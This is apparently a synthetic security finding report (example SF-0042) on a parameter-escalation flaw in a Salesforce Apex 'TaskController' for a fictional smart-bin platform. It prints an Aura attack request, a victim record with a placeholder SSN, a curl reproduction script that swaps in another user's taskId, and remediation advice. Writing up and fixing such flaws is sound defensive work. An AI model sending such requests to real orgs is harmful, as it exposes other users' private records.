# Security Analysis Report
**System:** CleanRoute IoT Platform (Salesforce-Integrated) — v4.6.0 (FINAL)
**Domain:** Waste Management / Smart Bins
**Example ID:** SF-0042
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation via `taskId` — attacker extends own session scope to read any Task record |

---

## Finding 1 — Single-User Parameter Escalation on Task Object (Pattern 10.2)

### Summary
The Apex controller `TaskController` on CleanRoute IoT Platform (`789a0916.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 10.2, the attacker exploits their own valid session to extend their scope beyond their authorised records by substituting a victim's `taskId` in the Aura payload. No SOQL ownership predicate prevents this. In a waste management / smart bins context, Task records may represent bin collection assignments, route maintenance orders, and IoT sensor servicing records with operator PII.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://789a0916.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://789a0916.lightning.force.com/aura
Authorization: Bearer 00D789A0916!AR789a0916...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D789A0916!AR789a0916...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"0010916","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Task Record Returned**
```json
{
  "actions": [
    {
      "id": "1;a",
      "state": "SUCCESS",
      "returnValue": {
        "records": [
          {
            "Id": "0010916",
            "Name": "Victim Task Record",
            "OwnerId": "005VICTIM",
            "InternalNotes__c": "CONFIDENTIAL: internal review notes",
            "SensitiveData__c": "SSN: 000-57-8476"
          }
        ]
      },
      "error": []
    }
  ]
}
```

### Evidence Map

| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 10.2 | Session scope extension | Classification | Attacker uses own valid session to access beyond authorised records |
| §7.0 OWD | Task: Private | Sharing config | Only record owner should have access |
| §8.0 RISK-SF-042 | No `with sharing` | Risk code | Sharing rules not enforced |
| §8.0 RISK-SF-043 | No ownership predicate | Risk code | Any `taskId` accepted |
| HAR descriptor | `c.TaskController.getTask` | Entry point | |
| HAR params | `taskId` | `0010916` | Victim Task record ID |
| HAR params | `fields` | Full sensitive list | `InternalNotes__c`, `SensitiveData__c` |
| HAR response | `OwnerId` | `005VICTIM` | Differs from attacker's session |
| HAR response | `SensitiveData__c` | `SSN: 000-57-8476` | Waste management operator PII |

### Steps to Reproduce

```bash
# Step 1 — Authenticate with a valid Salesforce session on 789a0916.lightning.force.com
SESSION="00D789A0916!AR789a0916..."

# Step 2 — Submit Aura action with victim taskId
curl -s -X POST "https://789a0916.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"0010916","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'

# Expected (vulnerable): state: "SUCCESS", OwnerId: "005VICTIM", SensitiveData__c: "SSN: 000-57-8476"
# Expected (secure): state: "ERROR" or empty records — INSUFFICIENT_ACCESS
```

### Remediation

1. **Declare controller `with sharing`:**
   ```apex
   public with sharing class TaskController { ... }
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()
   ```
   plus `WITH SECURITY_ENFORCED`
3. **Validate `taskId`** against the session user's accessible record set before executing.
4. **Remove client-controlled `fields` parameter** — define a server-side allowlist for Task fields.
5. **Validate `aura.token`** — submitted value is `undefined`.
6. **Waste management note:** Task records represent bin collection routes and IoT device servicing assignments. Operator SSN exposure (`000-57-8476`) is a direct PII breach. Route data exposure could also enable physical route prediction attacks.
